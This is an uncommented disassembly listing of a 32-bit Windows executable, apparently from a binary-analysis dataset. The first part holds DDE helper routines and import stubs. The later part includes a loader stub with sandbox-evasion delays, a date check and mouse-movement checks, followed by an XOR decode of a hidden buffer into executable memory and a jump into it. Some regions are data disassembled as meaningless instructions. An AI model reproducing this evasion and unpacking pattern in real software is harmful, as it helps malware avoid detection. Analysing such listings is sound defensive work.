mov eax [ ebp - 0x1004 ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_472234
test eax eax
je r-xdata
mov edx [ ebp + 0xc ]
call sub_471c14
mov esi eax
sub_472100
push ebp
mov ebp esp
xor edx edx
mov ecx [ eax + 0x3c ]
test ecx ecx
je r-xdata
mov eax edx
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov eax ecx
call sub_471d5c
mov edx eax
sub_472120
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x100c ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_472221
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax ebx
call sub_472358
test eax eax
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
lea eax [ ebp - 0x100c ]
lea edx [ ebp - 0x1008 ]
mov ecx 0x1000
call sub_404258
mov eax [ ebp - 0x100c ]
push eax
mov ecx [ ebx + 0x3c ]
mov edx [ ebx + 0x38 ]
mov eax ebx
call sub_472234
mov ebx eax
test ebx ebx
je r-xdata
mov dx [ ebp + 0x8 ]
call sub_472424
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472228
lea eax [ ebp - 0x100c ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax [ ebp + 0x8 ]
push eax
push esi
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4042a8
inc eax
push eax
mov eax [ ebp - 0x8 ]
call sub_4044a8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov [ ebp - 0x4 ] eax
sub_472234
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov edi edx
test edi edi
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
call sub_420e90
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
inc esi
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_4043f4
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x4 ]
inc [ ebp - 0x10 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_472234
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_420e64
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
sub_472308
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418550
mov ebx eax
mov eax [ ebx + 0x34 ]
mov edx [ esp ]
call sub_4043f4
jne r-xdata
sub_472358
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x44 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x44 ]
mov edx edi
call sub_418550
mov ebx eax
mov eax [ esp ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call DdeCmpStringHandles
test eax eax
jne r-xdata
sub_4723ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x30 ] ecx
xor edx edx
mov eax esi
call sub_42086c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035bc
mov eax esi
pop esi
pop ebx
retn
call sub_403614
pop [ fs : 0x0 ]
add esp 0xc
sub_4723e4
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4208b8
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ esi + 0x38 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_472424
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffffc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4724d9
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1004 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1004 ]
lea eax [ ebx + 0x34 ]
call sub_4040d8
cmp si 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4724e0
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push 0x0
movzx eax si
push eax
mov eax [ ebx + 0x38 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4042a8
inc eax
push eax
mov eax [ ebp - 0x4 ]
call sub_4044a8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_472508
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_40403c
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x34 ]
call sub_4042a8
test eax eax
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0x38 ] eax
pop esi
pop ebx
retn
push 0x3ec
mov eax [ ebx + 0x34 ]
call sub_4044a8
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ ebx + 0x38 ] eax
sub_472564
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_472595
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47259c
retn
mov eax rw-data
call sub_40cf90
sub_4725a0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4703f4
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417bd0
sub_472608
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ecx ] ch
inc edi
add [ edi + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
sub [ edi ] al
push esp
add eax [ eax ]
add ah dl
0x45
sub_472630
fmul [ edi ]
inc edx
add ah ch
test [ ebp ] r-xdata
mov ah 0x34
inc eax
add [ esi + ebx ] cl
inc esi
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] cl
cli
inc ebp
add [ ebx + ebx * 8 + 0x44 ] ch
add [ eax - 0x1 ] bh
inc ebp
add [ ebx + ecx * 4 + 0x41 ] cl
add al cl
sti
inc ebp
add [ esp + edi * 8 ] al
inc ebp
add [ eax ] dl
std
inc ebp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
mov [ 0xcd40046 ] al
inc edx
add [ eax ] ch
inc ecx
inc esi
add [ eax - 0xa ] ah
inc ebp
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x68 ] 0x1
add al [ esi ]
xor al 0xce
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add [ ebx + eax + 0x46 ] bl
add [ eax ] dl
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax + 0x5 ] dl
inc esi
add [ esp + eax ] bl
inc esi
add al bh
inc esp
add al cl
add eax 0x8a940046
inc esp
add [ eax + 0x440044ce ] cl
iretd
sub_4726da
inc esp
add [ eax - 0xc ] ch
inc ebp
add [ esp + ecx + 0x46 ] ch
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] dh
sbb [ esi ] eax
nop
sbb al 0x46
add [ ebx + ebx + 0x46 ] cl
add [ ebp - 0x5a6fffbc ] cl
inc esp
add al cl
sbb eax 0xa3f00046
inc esp
add [ eax - 0x30 ] ch
inc esp
add [ esp - 0x1da3ffba ] bh
inc esp
add ah ah
int3
sub_472712
inc esp
add al dl
cmp [ esi ] eax
pop esp
out dx al
inc ebp
add [ ecx + esi * 8 ] cl
inc ebp
add [ eax - 0x13ffb9d6 ] dh
cli
inc ebp
add [ eax - 0x5 ] ch
inc ebp
add [ eax + 0x2400463d ] dh
clc
inc ebp
add [ eax + edi + 0x1f940046 ] dh
inc esi
add [ eax + 0x3a ] ch
inc esi
add [ ebp + eax + 0x46 ] cl
add [ edi ] dl
add bh cl
sub [ edi ] al
clc
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc ebx
push 0x426b6365
outsd
js r-xdata
inc ebx
push 0x426b6365
outsd
js r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ esi ] al
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
add [ edi ] al
or al 0x3
add [ eax ] al
add al 0x0
or [ edi + 0x72 ] eax
outsd
jne r-xdata
jb r-xdata
jo r-xdata
js r-xdata
je r-xdata
or al 0x0
inc edx
outsd
js r-xdata
push ebx
jo r-xdata
arpl [ ebx + 0x42 ] bp
popad
jb r-xdata
je r-xdata
outsb
jne r-xdata
xor [ ebx + eax ] eax
cmp [ ebx ] al
insb
inc edx
outsd
outsb
xor [ ebx + eax ] ebx
add [ eax ] al
insb
outsd
outsb
je r-xdata
or [ eax ] al
pop es
push ebp
jo r-xdata
adc [ ebx ] al
add [ eax ] al
add eax 0x61500600
push cs
push edx
jo r-xdata
imul esi [ esp + esi * 2 + 0x65 ] 0x33c3172
add [ eax ] al
adc [ eax ] al
push es
inc edx
jbe r-xdata
xor [ eax ] esi
add eax [ eax ]
add [ 0x74530a00 ] cl
popad
je r-xdata
and al 0x3
add [ eax ] al
or al [ eax ]
pop es
dec eax
outsd
je r-xdata
add [ edi ] al
add [ edi ] al
inc edx
jne r-xdata
sbb [ ebx ] al
add [ eax ] al
pop es
outsb
insb
xor [ ebx + eax ] edx
add [ eax ] al
push es
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x31831
add [ esi ] al
push eax
popad
add al 0x3
add [ eax ] al
add eax [ eax ]
add eax 0x74696445
xor [ eax ] ecx
add eax [ eax ]
add [ eax ] al
add [ ecx ] cl
push esp
test [ edx ] 0x88
and eax [ ebp ]
lodsb [ esi ]
xlat
inc ebx
add ah dl
dec edi
imul ebp [ esi + 0x65 ] 0x3483172
add [ eax ] al
adc eax [ eax ]
or al 0x4d
insb
outsd
ja r-xdata
push ebx
add [ edx ] dl
add [ 0x43656c4f ] cl
outsd
outsb
je r-xdata
inc esp
add eax [ eax ]
imul esp [ fs : ecx + 0x50 ] 0x6579616c
jb r-xdata
dec ebp
outsd
push es
push esp
inc esi
outsd
jb r-xdata
inc eax
add [ eax ] dh
sub [ edi ] eax
pop es
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x631676f
push esp
inc esi
outsd
jb r-xdata
popad
insb
outsd
xor [ 0x4654 ] eax
xor [ eax + 0x3 ] eax
add [ eax ] al
adc [ eax ] eax
push cs
insb
je r-xdata
adc [ eax + 0x61 ] dl
push ebx
jae r-xdata
add [ eax ] al
str [ ecx ]
jns r-xdata
mov esp 0x6cbe0047
mov esp 0xc0330047
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor [ eax + 0x26 ] edx
inc edi
insd
dec esp
add eax [ eax ]
add [ eax + eax ] dl
insb
xor [ eax ] esp
add eax [ eax ]
add [ ecx ] cl
add [ ecx ] cl
push esp
inc edi
add [ edi ] al
add [ eax + 0x780042d4 ] ch
fiadd [ edx ]
lea eax [ eax ]
xor [ ecx ] ch
jo r-xdata
add [ esp + ecx * 8 ] bl
inc ebp
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx + 0x472950c0 ] cl
add [ ecx ] dl
add ch [ esi ]
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] ch
add [ 0x74696e55 ] al
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
xor [ esi ] edx
add [ eax + 0x43 ] ch
add al cl
retn
jbe r-xdata
outsd
outsb
popad
jb r-xdata
inc edx
push cs
dec eax
popad
jb r-xdata
sub [ ebx ] al
add [ eax ] al
or eax [ eax ]
or [ ecx + 0x6e ] al
imul ebp [ ebp + 0x61 ] 0x2c316574
add eax [ eax ]
add [ eax + eax ] cl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
nop
nop
mov [ ebx ] 0x1
inc ebx
add [ eax + 0x5c004344 ] dl
push edi
inc ebx
add [ esp + ebx * 2 + 0x43 ] dh
add [ esp + edi + 0x28b80043 ] bl
inc ebx
add al dl
mov edx 0x2c0045
inc ebx
add [ eax - 0x5fffbd0f ] ch
test [ esi ] r-xdata
test [ esi - 0x2b57ffba ] al
inc edx
add [ eax - 0x26 ] bh
inc edx
add [ ebp + 0x29300040 ] cl
aam 0x4f
imul esp [ ecx + 0x6c ] 0x5031676f
add eax [ eax ]
add [ 0x65520e00 ] dl
jo r-xdata
inc esp
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
add [ ecx ] dl
add [ esi ] cl
xor al 0x3
add [ eax ] al
push cs
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
nop
push 0x0
push 0x0
call WaitNamedPipeA
nop
push 0x0
push 0x0
call WaitNamedPipeA
nop
nop
inc [ ebx ]
cmp [ ebx ] 0x250f
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
push 0x0
push 0x0
call SetAbortProc
nop
call GetLastError
mov [ rw-data ] eax
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e0
jae r-xdata
nop
nop
jmp r-xdata
nop
nop
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
mov [ ebx ] 0x1
nop
jmp r-xdata
push 0x0
push 0x0
call WaitNamedPipeA
inc [ ebx ]
cmp [ ebx ] 0x8e0c
jne r-xdata
nop
nop
nop
mov eax 0x1ee3cafa
call sub_4026f4
mov ecx eax
nop
nop
test ecx ecx
je r-xdata
mov [ ebx ] 0x1
nop
mov eax [ ebx ]
inc eax
mov edi 0x5a
xor edx edx
div edi
mov eax ecx
add eax [ ebx ]
mov [ eax ] dl
nop
nop
inc [ ebx ]
cmp [ ebx ] 0x1ee3b2fb
jne r-xdata
nop
mov eax ecx
call sub_402714
nop
nop
mov [ ebx ] 0x1
push 0x0
push 0x0
call WaitNamedPipeA
inc [ ebx ]
cmp [ ebx ] 0x8ba3
jne r-xdata
xor eax eax
mov [ ebx ] eax
nop
nop
push rw-data
call GetCursorPos
nop
push 0x13
call sub_4063ec
cmp [ ebx ] 0x7
jbe r-xdata
nop
inc [ ebx ]
mov eax [ esi ]
mov [ rw-data ] eax
nop
nop
nop
nop
push esi
call GetCursorPos
nop
nop
mov eax [ esi ]
sub eax [ rw-data ]
cmp eax 0x2f
jbe r-xdata
nop
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_405238
nop
nop
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push 0x40
push 0x59a6
mov eax [ rw-data ]
push eax
call VirtualProtect
nop
nop
xor eax eax
mov [ ebx ] eax
nop
jmp r-xdata
mov eax [ rw-data ]
add eax [ ebx ]
mov al [ eax ]
nop
xor al 0x86
mov edx [ rw-data ]
add edx [ ebx ]
mov [ edx ] al
nop
nop
inc [ ebx ]
cmp [ ebx ] 0x59a7
jne r-xdata
nop
nop
mov ecx 0x259c
nop
nop
xchg ecx edx
nop
add edx [ rw-data ]
nop
jmp edx
sub_47299c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx rw-data
mov esi rw-data
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
nop
nop
mov [ ebx ] 0x1
nop
push 0x0
push 0x0
call WaitNamedPipeA
nop
push 0x0
push 0x0
call WaitNamedPipeA
nop
nop
inc [ ebx ]
cmp [ ebx ] 0x250f
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
nop
push 0x0
push 0x0
call SetAbortProc
nop
call GetLastError
mov [ rw-data ] eax
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e0
jae r-xdata
nop
nop
jmp r-xdata
nop
nop
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
mov [ ebx ] 0x1
nop
jmp r-xdata
push 0x0
push 0x0
call WaitNamedPipeA
inc [ ebx ]
cmp [ ebx ] 0x8e0c
jne r-xdata
nop
nop
nop
mov eax 0x1ee3cafa
call sub_4026f4
mov ecx eax
nop
nop
test ecx ecx
je r-xdata
mov [ ebx ] 0x1
nop
mov eax [ ebx ]
inc eax
mov edi 0x5a
xor edx edx
div edi
mov eax ecx
add eax [ ebx ]
mov [ eax ] dl
nop
nop
inc [ ebx ]
cmp [ ebx ] 0x1ee3b2fb
jne r-xdata
nop
mov eax ecx
call sub_402714
nop
nop
mov [ ebx ] 0x1
push 0x0
push 0x0
call WaitNamedPipeA
inc [ ebx ]
cmp [ ebx ] 0x8ba3
jne r-xdata
xor eax eax
mov [ ebx ] eax
nop
nop
push rw-data
call GetCursorPos
nop
push 0x13
call sub_4063ec
cmp [ ebx ] 0x7
jbe r-xdata
nop
inc [ ebx ]
mov eax [ esi ]
mov [ rw-data ] eax
nop
nop
nop
nop
push esi
call GetCursorPos
nop
nop
mov eax [ esi ]
sub eax [ rw-data ]
cmp eax 0x2f
jbe r-xdata
nop
mov eax rw-data
mov edx rw-data
mov ecx [ r-xdata ]
call sub_405238
nop
nop
cmp [ rw-data ] 0x0
jne r-xdata
push ebx
push 0x40
push 0x59a6
mov eax [ rw-data ]
push eax
call VirtualProtect
nop
nop
xor eax eax
mov [ ebx ] eax
nop
jmp r-xdata
mov eax [ rw-data ]
add eax [ ebx ]
mov al [ eax ]
nop
xor al 0x86
mov edx [ rw-data ]
add edx [ ebx ]
mov [ edx ] al
nop
nop
inc [ ebx ]
cmp [ ebx ] 0x59a7
jne r-xdata
nop
nop
mov ecx 0x259c
nop
nop
xchg ecx edx
nop
add edx [ rw-data ]
nop
jmp edx
sub_472bda
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039ec
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472c02
retn
sub_472c04
inc esp
add [ eax ] al
add [ esp + ebp ] cl
inc edi
add [ eax + 0x68004060 ] bl
pushad
inc eax
add [ esi + ebx * 2 + 0x5e380040 ] cl
inc eax
add [ eax ] ch
popad
inc eax
add al bh
pushad
inc eax
add [ esi + ebp * 2 ] cl
inc eax
add ah bl
insd
inc eax
add [ esi + ebp * 2 + 0x40 ] al
add [ esi + ebp * 2 ] dl
inc eax
add [ eax + 0x60004156 ] dl
push esi
inc ecx
add [ ecx + esi * 2 + 0x40 ] bl
add [ ecx + esi * 2 ] ch
inc eax
add [ eax ] dh
aad 0x40
add [ eax - 0x63ffbf2d ] dh
fld [ eax ]
insb
fld [ eax ]
mov esp 0x44004143
inc ebx
inc ecx
add [ eax + 0x58004145 ] cl
inc ebp
inc ecx
add [ eax ] bh
push ebx
inc ecx
add al ch
push edx
inc ecx
add [ ebx + ebx + 0x42 ] al
add [ edx + ebx - 0x69d3ffbe ] dl
inc edx
add ah bh
xchg ebp eax
inc edx
add ah ah
cwde
inc edx
add [ eax + ebx * 4 - 0x4d97ffbe ] dh
inc edx
add [ eax ] ch
mov dl 0x42
add [ eax ] dh
mov [ 0xffffffffa2000042 ] al
inc edx
add [ eax - 0x7fffbd66 ] dh
0x1ed00042 0x42
mov al [ 0xfffffffff000421e ]
xchg esp eax
inc edx
add [ esp + edx * 4 ] bl
inc edx
add [ ecx * 2 + 0x4cf40045 ] ah
inc ebp
add [ eax - 0x5e ] dh
inc edx
add [ eax - 0x5e ] al
inc edx
add ah ah
mov ah 0x45
add [ esp + esi * 4 + 0x45 ] dh
add [ eax - 0x77ffbd3c ] bh
les eax [ edx ]
pushad
into
inc edx
add [ esi + ecx * 8 ] cl
inc edx
add ah al
iretd
sub_472cd6
inc edx
add [ edi + ecx * 8 - 0x3073ffbe ] dl
inc edx
add [ edi + ecx * 8 + 0x42 ] bl
add [ edi + ecx * 8 + 0x42 ] dl
add [ edi + ecx * 8 ] ah
inc edx
add [ edi + ecx * 8 ] bl
inc edx
add ah ch
into
inc edx
add ah bh
iretd
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_472c04
call sub_406024
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466e10
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_466e28
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466ea8
call sub_403ef8
sub_401187
add [ esp + 0x4 ] 0xfffffff8
jmp sub_40597c
sub_401191
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405990
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_401264
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_401294
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_40129c
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_4012a4
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_4012c4
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_4012dc
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4012e4
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_401304
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
sub_40131c
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_401334
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_401344
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401390
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401398
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_4013a0
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401aea
jmp sub_4039ec
sub_401af1
mov al [ rw-data ]
pop ebp
retn
sub_401bce
jmp sub_4039ec
sub_401c9c
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022b0
retn
sub_40229c
jmp sub_4039ec
sub_402442
jmp sub_4039ec
sub_4026e1
jmp sub_4039ec
sub_4027a4
call sub_405fd8
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405fd8
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027f8
mov [ rw-data ] edx
call sub_403fd0
sub_40285c
push eax
push edx
push ecx
call sub_405fd8
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402850
retn
sub_402878
retn
sub_4028cc
retn
sub_4028d0
push ebx
call sub_405fd8
mov ebx [ eax + 0x4 ]
call sub_405fd8
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a88
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a98
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402b10
mov edx [ eax + 0x1c ]
call sub_402ac8
retn
sub_402d78
mov ecx 0xff
call sub_402d84
retn
sub_402da8
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402dc4
jmp sub_402dc4
sub_402dc1
retn
sub_403151
jmp sub_4039ec
sub_4031a4
fninit
fwait
fldcw [ rw-data ]
retn
sub_4031fc
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403208
push ebx
mov ebx eax
mov eax ebx
call sub_403238
call sub_4026f4
mov edx eax
mov eax ebx
call sub_40327c
pop ebx
retn
sub_403224
push ebx
mov ebx eax
mov eax ebx
call sub_4032d4
mov eax ebx
call sub_402714
pop ebx
retn
sub_403238
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403260
call sub_403624
test dl dl
jle r-xdata
retn
call sub_40360c
sub_403320
retn
sub_4033a8
jmp sub_4039ec
sub_4033af
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034a0
mov eax 0x8000ffff
retn
sub_4034a8
retn
sub_4034ac
retn
sub_4034b0
retn
sub_4035e5
jmp sub_403738
sub_4035ea
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a4c
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_40360c
sub_40360c
mov edx [ eax ]
call [ edx - 0x8 ]
